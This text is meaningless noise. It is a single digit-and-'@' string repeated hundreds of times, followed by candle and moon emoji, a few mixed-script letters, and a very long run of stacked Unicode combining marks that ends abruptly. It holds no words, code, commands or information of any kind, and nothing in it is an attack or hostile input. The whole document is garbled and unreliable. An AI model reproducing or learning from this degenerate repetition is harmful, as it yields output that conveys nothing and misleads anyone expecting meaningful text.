54491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086🕯️۞͓͓͓͓͖͖͖̈́̈́̈́̈́͗͗͗͗͗͗͗͗͗͗ƤǶƎߕ௦̴̧̫̫̫̫̦̪̪̞̪̭̪̙̜̖̖̩̬̩̭̞̗̝̐̐̑̕۞͓͓͓͓͖͖͖̈́̈́̈́̈́͗͗͗͗͗͗͗͗͗͗🕯️ 🌑͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̈́͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛